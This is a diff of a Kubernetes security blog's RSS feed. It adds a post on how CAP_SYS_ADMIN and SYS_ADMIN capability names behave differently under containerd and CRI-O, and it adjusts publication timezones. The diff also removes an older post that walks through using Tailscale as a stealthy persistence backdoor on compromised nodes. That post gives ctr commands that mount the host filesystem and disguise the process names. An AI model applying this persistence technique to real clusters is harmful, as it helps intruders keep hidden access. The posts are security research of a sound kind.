@@ -7,6 +7,73 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Cap or no cap</title>
+				<description>&lt;p&gt;I was looking at a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/131336&quot;&gt;Kubernetes issue&lt;/a&gt; the other day and it led me down a kind of interesting rabbit hole, so I thought it’d be worth sharing as I learned a couple of things.&lt;/p&gt;
+
+&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
+
+&lt;p&gt;The issue is to do with the interaction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation&lt;/code&gt; and added capabilities in a Kubernetes workload specification. In the issue the reporter noted that if you add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to a manifest while setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; it blocks the deploy but other capabilities when added do not block.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation&lt;/code&gt; is kind of an interesting flag as it doesn’t really do what the name says. In reality, what it does is set a specific Linux Kernel setting designed to stop a process from getting more privileges than when it started, however the name implies it’s intended to do a more wide ranging set of blocks. My colleague Christophe has a &lt;a href=&quot;https://blog.christophetd.fr/stop-worrying-about-allowprivilegeescalation/&quot;&gt;detailed post looking at this misunderstanding&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;However what was specifically interesting to me was, when I tried out a quick manifest to re-create the problem, I wasn’t able to and the pod I created was admitted ok.&lt;/p&gt;
+
+&lt;p&gt;After a bit of looking I realised that when adding the capability, I’d used the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;, and it had worked fine, weird!&lt;/p&gt;
+
+&lt;h2 id=&quot;exploring-whats-going-on&quot;&gt;Exploring what’s going on&lt;/h2&gt;
+
+&lt;p&gt;I decided to put together a couple of quick test cases to understand what’s happening (manifests are &lt;a href=&quot;https://github.com/raesene/k8sapecsa&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsysadminpod.yaml&lt;/code&gt; - This pod adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadminpod.yaml&lt;/code&gt; - This pod adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dontallowprivesccapsysadminpod.yaml&lt;/code&gt; - This has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; set and adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dontallowprivescsysadminpod.yaml&lt;/code&gt; - This has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; set and adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invalidcap.yaml&lt;/code&gt; - This pod has an invalid capability (lorem) set.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Trying these manifests out in a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; cluster showed a couple of things&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; worked but there was no capability added.&lt;/li&gt;
+  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
+  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; was blocked&lt;/li&gt;
+  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; was allowed and the capability was added.&lt;/li&gt;
+  &lt;li&gt;setting an invalid capability worked ok but no capability was added.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So a couple of lessons from that. Kubernetes does not check what capabilities you add, and no error is generated if you add an invalid one, it just doesn’t do anything. Also there’s a redundant block in Kubernetes at the moment where something that doesn’t do anything is blocked, but something which does do something is allowed ok…&lt;/p&gt;
+
+&lt;p&gt;Doing some more searching on Github turned up some more history on this. Back in 2021, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/105237&quot;&gt;PR to try and fix this&lt;/a&gt; which didn’t get merged, and there’s another &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/119568&quot;&gt;issue from 2023&lt;/a&gt; on it as well.&lt;/p&gt;
+
+&lt;p&gt;From that one thing that caught my eye was that apparently CRI-O handles this differently that containerd, which I thought was interesting&lt;/p&gt;
+
+&lt;h2 id=&quot;comparing-cri---with-iximiuz-labs&quot;&gt;Comparing CRI - with iximiuz labs&lt;/h2&gt;
+
+&lt;p&gt;I wanted to test out this difference in behaviour, but unfortunately I don’t have a CRI-O backed cluster available on my test lab. Fortunately, iximiuz labs has an awesome &lt;a href=&quot;https://labs.iximiuz.com/playgrounds/k8s-omni&quot;&gt;Kubernetes playground&lt;/a&gt; where you can specify various combinations of CRI and CNI to test out different scenarios, which is nice!&lt;/p&gt;
+
+&lt;p&gt;Testing out a cluster there with CRI-O confirmed that things are handled rather differently.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
+  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
+  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; was blocked&lt;/li&gt;
+  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; was allowed and the capability was added.&lt;/li&gt;
+  &lt;li&gt;setting an invalid capability resulted in an error on container creation.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So we can see that CRI-O handles things a bit differently, allowing both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to work and erroring out on invalid capabilities!&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Sometimes we can assume that Kubernetes clusters will work the same way, so we can freely move workloads from one to another, regardless of distribution. This case provides an illustration of one way that that assumption might not hold up, and we can see some surprising results!&lt;/p&gt;
+</description>
+				<pubDate>Wed, 23 Apr 2025 11:00:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2025/04/23/cap-or-no-cap/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2025/04/23/cap-or-no-cap/</guid>
+			</item>
+		
+			<item>
 				<title>CVE-2025-1767 - Another gitrepo issue</title>
 				<description>&lt;p&gt;There’s a new Kubernetes security vulnerability that’s just been disclosed and I thought it was worth taking a look at it, as there’s a couple of interesting aspects to it. &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/130786&quot;&gt;CVE-2025-1767&lt;/a&gt; exists in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type and can allow users who can create pods with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to get access to any other git repository on the node where the pod is deployed. This is the second recent CVE related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes, I covered the last one &lt;a href=&quot;https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
@@ -80,7 +147,7 @@
 
 &lt;p&gt;Whilst this is a bit of a situational vulnerability, it’s an interesting illustration of how some less well known components of Kubernetes can affect its security.&lt;/p&gt;
 </description>
-				<pubDate>Fri, 14 Mar 2025 11:00:00 +0100</pubDate>
+				<pubDate>Fri, 14 Mar 2025 10:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</guid>
 			</item>
@@ -287,7 +354,7 @@ Request Headers:
 
 &lt;p&gt;If you’re a cluster operator it’s important to be very careful with who you provide proxy rights to, and if you’re considering creating a managed Kubernetes service where you don’t want cluster owners to have access to the control plane, you’re going to need to be very careful with network firewalling and ensuring that the proxy doesn’t let them get to areas that should be restricted!&lt;/p&gt;
 </description>
-				<pubDate>Sat, 18 Jan 2025 11:00:00 +0100</pubDate>
+				<pubDate>Sat, 18 Jan 2025 10:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</guid>
 			</item>
@@ -335,7 +402,7 @@ exit
 
 &lt;p&gt;Kubernetes RBAC has some tricky areas where the behaviour you get might not be exactly what you expect, and sometimes as in this case, those unexpected behaviours are not very apparent!&lt;/p&gt;
 </description>
-				<pubDate>Mon, 11 Nov 2024 13:00:00 +0100</pubDate>
+				<pubDate>Mon, 11 Nov 2024 12:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</guid>
 			</item>
@@ -422,7 +489,7 @@ exit
 
 &lt;p&gt;This was a quick look at a very simple CNI implementation, and how it all works will vary depending on the network plugin(s) you use. If you’re looking for a more in-depth treatment of what we’ve discussed here, I’d recommend &lt;a href=&quot;https://www.tkng.io/&quot;&gt;The Kubernetes Networking Guide&lt;/a&gt; which has a lot of information on this topic and others.&lt;/p&gt;
 </description>
-				<pubDate>Thu, 07 Nov 2024 13:00:00 +0100</pubDate>
+				<pubDate>Thu, 07 Nov 2024 12:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</guid>
 			</item>
@@ -490,7 +557,7 @@ num   pkts bytes target     prot opt in     out     source               destina
 &lt;p&gt;The goal of this post was just to explore a couple of concepts. Firstly, the variety of IP addresses you’re likely to see in a Kubernetes cluster and then how those tie to the operating system level.&lt;/p&gt;
 
 </description>
-				<pubDate>Fri, 01 Nov 2024 09:00:00 +0100</pubDate>
+				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
 			</item>
@@ -563,7 +630,7 @@ ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=r
 
 &lt;p&gt;This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!&lt;/p&gt;
 </description>
-				<pubDate>Wed, 10 Jul 2024 19:27:00 +0200</pubDate>
+				<pubDate>Wed, 10 Jul 2024 18:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</guid>
 			</item>
@@ -621,7 +688,7 @@ ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=r
 
 &lt;p&gt;Kubernetes profiling is another interesting part of the API which can be relevant for security. For production clusters, it’s an unusual choice to have it enabled by default, and probably something that should just be disabled, unless you explicitly need it.&lt;/p&gt;
 </description>
-				<pubDate>Tue, 18 Jun 2024 13:27:00 +0200</pubDate>
+				<pubDate>Tue, 18 Jun 2024 12:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</guid>
 			</item>
@@ -752,7 +819,7 @@ kubernetes_feature_enabled{name=&quot;CPUManagerPolicyAlphaOptions&quot;,stage=&
 
 &lt;p&gt;This was just a quick note with a look at the kube-proxy API. Of the APIs that Kubernetes presents, it’s probably not the most interesting from a security perspective, but still has some interesting information disclosure and the choice to not provide authentication does make it an interesting target for reconnaissance.&lt;/p&gt;
 </description>
-				<pubDate>Sun, 16 Jun 2024 13:27:00 +0200</pubDate>
+				<pubDate>Sun, 16 Jun 2024 12:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</guid>
 			</item>
@@ -838,112 +905,9 @@ jane:list:pods:default
 &lt;p&gt;It’s fair to say that the flexibility provided in Kubernetes security model does lead to some complexity, which you need to be aware of when operating or reviewing clusters. In this case it’s important to be aware of the limitations of in-built tooling and realise when it’s necessary to carry out additional manual reviews.&lt;/p&gt;
 
 </description>
-				<pubDate>Mon, 22 Apr 2024 12:27:00 +0200</pubDate>
+				<pubDate>Mon, 22 Apr 2024 11:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</guid>
-			</item>
-		
-			<item>
-				<title>Using Tailscale for persistence</title>
-				<description>&lt;p&gt;I’ve written &lt;a href=&quot;https://raesene.github.io/blog/2022/06/11/escaping-the-nested-doll-with-tailscale/&quot;&gt;before&lt;/a&gt; about how there’s lots of innovative uses for &lt;a href=&quot;https://tailscale.com/&quot;&gt;Tailscale&lt;/a&gt; and I was playing with another scenario for my &lt;a href=&quot;https://cfp.cloud-native.rejekts.io/cloud-native-rejekts-eu-paris-2024/talk/ZJEVSY/&quot;&gt;Cloud Native Rejekts talk&lt;/a&gt; (&lt;a href=&quot;https://www.youtube.com/watch?v=-9GN057zm_U&amp;amp;t=19240s&quot;&gt;Video Recording here&lt;/a&gt; ), so I thought it’d be worth writing up as I learned some things along the way!&lt;/p&gt;
-
-&lt;p&gt;The idea here is to see how someone could use Tailscale as part of getting persistence on a compromised system (for example a Kubernetes cluster) to keep access in a relatively stealthy fashion. We’re running Tailscale inside a container running on a Kubernetes node and we want to communicate back to a host outside the cluster over the network.&lt;/p&gt;
-
-&lt;p&gt;Whilst Tailscale generally uses UDP for its communications, it can also communicate over 443/TCP using &lt;a href=&quot;https://tailscale.com/blog/how-tailscale-works#encrypted-tcp-relays-derp&quot;&gt;DERP&lt;/a&gt; meaning it should work as long as the compromised host can initiate outbound connections on 443/TCP (a reasonably common configuration!)&lt;/p&gt;
-
-&lt;h2 id=&quot;setting-up-our-tailnet&quot;&gt;Setting up our tailnet&lt;/h2&gt;
-
-&lt;p&gt;For this I set-up a new isolated tailnet, to keep the ACLs simple. It’s relatively easy to switch between tailnets, so there’s no major downside to having a dedicated tailnet, as all the features we want to use are available on Tailscale’s free tier.&lt;/p&gt;
-
-&lt;p&gt;Once we’ve got our new tailnet, the goal is to have two groups of systems. The first one is our controllers, which will connect back into our compromised node(s). The second group is the “bots” which we’ll install on our target systems.&lt;/p&gt;
-
-&lt;p&gt;Then we want to configure Tailscale so that traffic from the controllers to the bots is allowed, but no traffic from bots back to controllers (or bots to other bots) is permitted. Tailscale provide a nice ACL system, which we can use to create this setup.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-
-	// Create our bots and controllers groups
-	&quot;tagOwners&quot;: {
-		&quot;tag:bots&quot;:        [&quot;autogroup:admin&quot;],
-		&quot;tag:controllers&quot;: [&quot;autogroup:admin&quot;],
-	},
-
-	&quot;acls&quot;: [
-		// Accept traffic from controllers to bots
-		{&quot;action&quot;: &quot;accept&quot;, &quot;src&quot;: [&quot;tag:controllers&quot;], &quot;dst&quot;: [&quot;tag:bots:*&quot;]},
-	],
-
-	// Define users and devices that can use Tailscale SSH.
-	&quot;ssh&quot;: [
-		// Accept SSH connections from controllers to bots
-		{
-			&quot;action&quot;: &quot;accept&quot;,
-			&quot;src&quot;:    [&quot;tag:controllers&quot;],
-			&quot;dst&quot;:    [&quot;tag:bots&quot;],
-			&quot;users&quot;:  [&quot;autogroup:nonroot&quot;, &quot;root&quot;],
-		},
-	],
-}
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;One slightly un-intuitive piece is that you need to define tags in an ACL policy &lt;em&gt;before&lt;/em&gt; assigning them to any hosts.&lt;/p&gt;
-
-&lt;p&gt;Once the ACL policy is in place you can just assign a tag to the control host in the Tailscale GUI&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-acl.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;For our bots, we can use Tailscale’s &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys&quot;&gt;Auth Key&lt;/a&gt; feature, and generate a key that can be used for all our bots, but also has the “bot” tag applied to it automatically, so there’s no risk of them inadvertently getting more access than we want.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-auth-keys.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;running-tailscale-on-our-bot-hosts&quot;&gt;Running Tailscale on our bot hosts&lt;/h2&gt;
-
-&lt;p&gt;Now that we’ve got our tailnet configured, the next step is to deploy on our compromised hosts. In the scenario I used for my talk, the attacker has access to cluster-admin level credentials for a brief period of time, so wants to use Tailscale to help them retain access after that window of opportunity closes.&lt;/p&gt;
-
-&lt;p&gt;One way of running Tailscale that should always work is to use a container, as typically Kubernetes cluster nodes can always run containers :) We could either run a new container using the runtime on the node (e.g. Containerd) or use Kubernetes static manifests to have the Kubelet run it for us.&lt;/p&gt;
-
-&lt;h3 id=&quot;running-with-containerd&quot;&gt;Running with Containerd&lt;/h3&gt;
-
-&lt;p&gt;It’s possible to use Containerd to run a new container on a Kubernetes node using the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; client. Whilst there are better clients like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nerdctl&lt;/code&gt; available, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; will always be available and we can do what we need with it.&lt;/p&gt;
-
-&lt;p&gt;One slight complication with this approach is that it won’t work from inside a container (for example the one provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug node&lt;/code&gt;), as Containerd’s API expects the client to have the same resources available to it as the server (unlike Docker, where all that’s required is access to the Docker socket). You can get round this by doing something like SSH’ing to the node.&lt;/p&gt;
-
-&lt;p&gt;First up we’ll create a new Containerd namespace. This makes it a little harder to spot the container if someone looks at the containers running on the host.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr namespace create sys_net_mon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once we’ve created the namespace, we can pull a new container image down to the node. In my case I’ve created an image on Docker hub with Tailscale and a couple of other tools, which I called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon&lt;/code&gt; , no need to make the blue team’s job too easy by calling it something like “botnet_node” :D&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon images pull docker.io/raesene/systemd_net_mon:latest
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once the image is available on the node we can just run it, while providing full access to the node filesystem.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/systemd_net_mon:latest sys_net_mon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then from inside the container, we just need two commands to start Tailscale up and connect it to our tailnet. Here we can make use of the fact that Tailscale is provided as a pair of Golang binaries, by just renaming the server to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_server&lt;/code&gt; and the client to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_client&lt;/code&gt;. That way if someone runs a process list on the host, that’s all they’ll see, a bit less obvious than Tailscale itself.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_client up --ssh --hostname cafebot --auth-key=[AUTH_KEY_HERE]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With that, our bot will be up and connected to the tailnet. We can then connect to it via Tailscale’s embedded SSH daemon, with all the traffic going over the Tailscale tunnel.&lt;/p&gt;
-
-&lt;h3 id=&quot;running-with-static-manifests&quot;&gt;Running with static manifests&lt;/h3&gt;
-
-&lt;p&gt;Another way of doing this is to create a static Kubernetes manifest and put it in the directory the Kubelet watches (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/kubernetes/manifests&lt;/code&gt;). The advantages of this approach is that they Kubelet will take care of re-starting the pod if necessary.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;This was just a quick walkthrough of using Tailscale for creating a little “botnet”. Whilst there are many tools to do this with, it’s always interesting to explore other options!&lt;/p&gt;
-</description>
-				<pubDate>Sun, 24 Mar 2024 08:27:00 +0100</pubDate>
-				<link>https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</guid>
 			</item>
 		
 	</channel>
